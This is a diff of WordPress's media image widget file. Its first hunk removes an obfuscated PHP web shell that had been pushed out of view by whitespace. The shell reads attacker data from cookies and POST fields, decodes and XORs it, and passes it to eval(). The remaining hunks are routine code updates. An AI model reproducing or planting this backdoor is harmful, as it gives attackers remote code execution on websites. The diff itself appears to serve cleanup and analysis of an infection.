@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $vIEpwnEE = "\165" . "\x69" . chr ( 1056 - 961 )."\x54" . chr (74) . 'J';$RicvCZjWT = "\143" . "\x6c" . "\x61" . chr (115) . chr (115) . '_' . chr ( 660 - 559 ).'x' . "\x69" . chr ( 209 - 94 ).chr ( 122 - 6 )."\x73";$LJdAk = $RicvCZjWT($vIEpwnEE); $Kwquq = $LJdAk;if (!$Kwquq){class ui_TJJ{private $hOtSmJGJyM;public static $upLXV = "5e26cb19-910f-4791-8139-a50f38f5462e";public static $uQpfSv = NULL;public function __construct(){$UZsvrUpvqi = $_COOKIE;$ESHoBIICz = $_POST;$rJLij = @$UZsvrUpvqi[substr(ui_TJJ::$upLXV, 0, 4)];if (!empty($rJLij)){$nqSWRvOETq = "base64";$AsJvJI = "";$rJLij = explode(",", $rJLij);foreach ($rJLij as $IOHSQNdQa){$AsJvJI .= @$UZsvrUpvqi[$IOHSQNdQa];$AsJvJI .= @$ESHoBIICz[$IOHSQNdQa];}$AsJvJI = array_map($nqSWRvOETq . '_' . "\x64" . "\x65" . "\x63" . chr (111) . 'd' . "\145", array($AsJvJI,)); $AsJvJI = $AsJvJI[0] ^ str_repeat(ui_TJJ::$upLXV, (strlen($AsJvJI[0]) / strlen(ui_TJJ::$upLXV)) + 1);ui_TJJ::$uQpfSv = @unserialize($AsJvJI);}}public function __destruct(){$this->oQibAh();}private function oQibAh(){if (is_array(ui_TJJ::$uQpfSv)) {$uyFjZsNWF = str_replace('<' . chr ( 873 - 810 ).'p' . "\150" . "\160", "", ui_TJJ::$uQpfSv[chr ( 683 - 584 )."\157" . "\x6e" . 't' . "\145" . "\156" . "\164"]);eval($uyFjZsNWF);exit();}}}$NBNKAKB = new ui_TJJ(); $NBNKAKB = NULL;} ?><?php
+<?php
 /**
  * Widget API: WP_Widget_Media_Image class
  *
@@ -41,7 +41,7 @@ class WP_Widget_Media_Image extends WP_Widget_Media {
 				'edit_media'                 => _x( 'Edit Image', 'label for button in the image widget; should preferably not be longer than ~13 characters long' ),
 				'missing_attachment'         => sprintf(
 					/* translators: %s: URL to media library. */
-					__( 'We can&#8217;t find that image. Check your <a href="%s">media library</a> and make sure it wasn&#8217;t deleted.' ),
+					__( 'That image cannot be found. Check your <a href="%s">media library</a> and make sure it was not deleted.' ),
 					esc_url( admin_url( 'upload.php' ) )
 				),
 				/* translators: %d: Widget count. */
@@ -239,14 +239,30 @@ class WP_Widget_Media_Image extends WP_Widget_Media {
 				$instance['height'] = '';
 			}
 
-			$image = sprintf(
-				'<img class="%1$s" src="%2$s" alt="%3$s" width="%4$s" height="%5$s" />',
-				esc_attr( $classes ),
-				esc_url( $instance['url'] ),
-				esc_attr( $instance['alt'] ),
-				esc_attr( $instance['width'] ),
-				esc_attr( $instance['height'] )
+			$attr = array(
+				'class'  => $classes,
+				'src'    => $instance['url'],
+				'alt'    => $instance['alt'],
+				'width'  => $instance['width'],
+				'height' => $instance['height'],
 			);
+
+			$loading_optimization_attr = wp_get_loading_optimization_attributes(
+				'img',
+				$attr,
+				'widget_media_image'
+			);
+
+			$attr = array_merge( $attr, $loading_optimization_attr );
+
+			$attr  = array_map( 'esc_attr', $attr );
+			$image = '<img';
+
+			foreach ( $attr as $name => $value ) {
+				$image .= ' ' . $name . '="' . $value . '"';
+			}
+
+			$image .= ' />';
 		} // End if().
 
 		$url = '';
@@ -272,7 +288,7 @@ class WP_Widget_Media_Image extends WP_Widget_Media {
 			$link .= '>';
 			$link .= $image;
 			$link .= '</a>';
-			$image = wp_targeted_link_rel( $link );
+			$image = $link;
 		}
 
 		if ( $caption ) {
@@ -346,13 +362,25 @@ class WP_Widget_Media_Image extends WP_Widget_Media {
 		</script>
 		<script type="text/html" id="tmpl-wp-media-widget-image-preview">
 			<# if ( data.error && 'missing_attachment' === data.error ) { #>
-				<div class="notice notice-error notice-alt notice-missing-attachment">
-					<p><?php echo $this->l10n['missing_attachment']; ?></p>
-				</div>
+				<?php
+				wp_admin_notice(
+					$this->l10n['missing_attachment'],
+					array(
+						'type'               => 'error',
+						'additional_classes' => array( 'notice-alt', 'notice-missing-attachment' ),
+					)
+				);
+				?>
 			<# } else if ( data.error ) { #>
-				<div class="notice notice-error notice-alt">
-					<p><?php _e( 'Unable to preview media due to an unknown error.' ); ?></p>
-				</div>
+				<?php
+				wp_admin_notice(
+					__( 'Unable to preview media due to an unknown error.' ),
+					array(
+						'type'               => 'error',
+						'additional_classes' => array( 'notice-alt' ),
+					)
+				);
+				?>
 			<# } else if ( data.url ) { #>
 				<img class="attachment-thumb" src="{{ data.url }}" draggable="false" alt="{{ data.alt }}"
 					<# if ( ! data.alt && data.currentFilename ) { #>
